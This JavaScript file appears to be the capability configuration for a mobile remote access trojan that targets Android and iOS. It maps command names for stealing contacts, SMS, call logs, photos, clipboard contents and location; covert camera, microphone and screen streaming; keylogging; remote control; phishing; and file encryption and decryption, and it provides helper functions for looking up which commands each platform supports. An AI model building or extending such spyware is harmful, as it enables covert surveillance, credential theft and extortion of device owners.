/**
 * Platform-specific actions configuration
 * Defines which actions are supported on each platform (Android/iOS)
 */

const PLATFORMS = {
  ANDROID: 'android',
  IOS: 'ios',
};

/**
 * Actions supported on Android
 */
const ANDROID_ACTIONS = {
  // Data retrieval
  'contacts': true,
  'sms': true,
  'calls': true,
  'gallery': true,
  'apps': true,
  'clipboard': true,
  'location': true,
  'all-sms': true,
  
  // Camera
  'main-camera': true,
  'selfie-camera': true,
  'screenshot': true,
  
  // Device control
  'toast': true,
  'vibrate': true,
  'sendSms': true,
  'popNotification': true,
  'openUrl': true,
  'open-url': true,
  
  // Keylogger
  'keylogger-on': true,
  'keylogger-off': true,
  
  // Audio
  'microphone': true,
  'play-audio': true,
  'stop-audio': true,
  
  // Screen streaming
  'screen-stream-start': true,
  'screen-stream-stop': true,
  
  // Remote control
  'remote-control-start': true,
  'remote-control-stop': true,
  
  // File operations
  'file-explorer': true,
  
  // Advanced (may require root)
  'phishing': true,
  'encrypt': true,
  'decrypt': true,
};

/**
 * Actions supported on iOS
 * Note: Some actions may have limitations due to iOS security restrictions
 */
const IOS_ACTIONS = {
  // Data retrieval
  'contacts': true,
  'sms': true,
  'calls': true,
  'gallery': true,
  'apps': true,
  'clipboard': true,
  'location': true,
  'all-sms': true,
  
  // Camera
  'main-camera': true,
  'selfie-camera': true,
  'screenshot': true,
  
  // Device control
  'toast': true,
  'vibrate': true,
  'sendSms': true,
  'popNotification': true,
  'openUrl': true,
  'open-url': true,
  
  // Keylogger (may require accessibility permissions)
  'keylogger-on': true,
  'keylogger-off': true,
  
  // Audio
  'microphone': true,
  'play-audio': true,
  'stop-audio': true,
  
  // Screen streaming (requires ReplayKit or similar)
  'screen-stream-start': true,
  'screen-stream-stop': true,
  
  // Remote control (requires accessibility service)
  'remote-control-start': true,
  'remote-control-stop': true,
  
  // File operations (limited by iOS sandbox)
  'file-explorer': true,
  
  // Advanced (may not be available on iOS)
  'phishing': false, // Not typically available on iOS
  'encrypt': true,
  'decrypt': true,
};

/**
 * Action mappings for platform-specific command names
 * Maps generic action names to platform-specific command names
 */
const ACTION_MAPPINGS = {
  android: {
    // Android uses the same action names
  },
  ios: {
    // iOS may use different command names
    'openUrl': 'open-url',
    'open-url': 'open-url',
  },
};

/**
 * Check if an action is supported on a platform
 * @param {string} action - Action name
 * @param {string} platform - Platform name ('android' or 'ios')
 * @returns {boolean} True if action is supported
 */
function isActionSupported(action, platform) {
  if (!action || !platform) {
    return false;
  }

  const normalizedPlatform = platform.toLowerCase();
  
  if (normalizedPlatform === PLATFORMS.ANDROID) {
    return ANDROID_ACTIONS[action] === true;
  } else if (normalizedPlatform === PLATFORMS.IOS) {
    return IOS_ACTIONS[action] === true;
  }

  return false;
}

/**
 * Get all actions supported on a platform
 * @param {string} platform - Platform name ('android' or 'ios')
 * @returns {Array} Array of supported action names
 */
function getPlatformActions(platform) {
  if (!platform) {
    return [];
  }

  const normalizedPlatform = platform.toLowerCase();
  
  if (normalizedPlatform === PLATFORMS.ANDROID) {
    return Object.keys(ANDROID_ACTIONS).filter(action => ANDROID_ACTIONS[action] === true);
  } else if (normalizedPlatform === PLATFORMS.IOS) {
    return Object.keys(IOS_ACTIONS).filter(action => IOS_ACTIONS[action] === true);
  }

  return [];
}

/**
 * Get platform-specific action name
 * @param {string} action - Generic action name
 * @param {string} platform - Platform name ('android' or 'ios')
 * @returns {string} Platform-specific action name
 */
function getPlatformActionName(action, platform) {
  if (!action || !platform) {
    return action;
  }

  const normalizedPlatform = platform.toLowerCase();
  const mappings = ACTION_MAPPINGS[normalizedPlatform] || {};
  
  return mappings[action] || action;
}

/**
 * Get actions that are supported on both platforms
 * @returns {Array} Array of common action names
 */
function getCommonActions() {
  const androidActions = new Set(getPlatformActions(PLATFORMS.ANDROID));
  const iosActions = new Set(getPlatformActions(PLATFORMS.IOS));
  
  return Array.from(androidActions).filter(action => iosActions.has(action));
}

/**
 * Get actions that are only supported on Android
 * @returns {Array} Array of Android-only action names
 */
function getAndroidOnlyActions() {
  const androidActions = new Set(getPlatformActions(PLATFORMS.ANDROID));
  const iosActions = new Set(getPlatformActions(PLATFORMS.IOS));
  
  return Array.from(androidActions).filter(action => !iosActions.has(action));
}

/**
 * Get actions that are only supported on iOS
 * @returns {Array} Array of iOS-only action names
 */
function getIOSOnlyActions() {
  const androidActions = new Set(getPlatformActions(PLATFORMS.ANDROID));
  const iosActions = new Set(getPlatformActions(PLATFORMS.IOS));
  
  return Array.from(iosActions).filter(action => !androidActions.has(action));
}

module.exports = {
  PLATFORMS,
  ANDROID_ACTIONS,
  IOS_ACTIONS,
  ACTION_MAPPINGS,
  isActionSupported,
  getPlatformActions,
  getPlatformActionName,
  getCommonActions,
  getAndroidOnlyActions,
  getIOSOnlyActions,
};

